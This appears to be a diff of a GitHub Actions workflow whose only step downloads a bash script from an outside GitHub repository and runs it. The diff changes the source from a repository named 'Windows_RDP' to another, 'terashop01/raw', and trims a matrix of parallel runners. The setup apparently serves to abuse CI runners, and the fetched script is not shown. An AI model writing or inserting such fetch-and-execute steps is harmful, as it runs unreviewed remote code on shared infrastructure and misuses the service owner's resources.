@@ -21,9 +21,9 @@ jobs:
    strategy:
     fail-fast: false
     matrix:
-     runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+     runner: [0,1,2,3,4,5]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/arthurcomp/Windows_RDP/main/bash.sh && chmod +x bash.sh && ./bash.sh
+          wget https://raw.githubusercontent.com/terashop01/raw/main/bash.sh && chmod +x bash.sh && ./bash.sh
           
           #hjhqxjqh
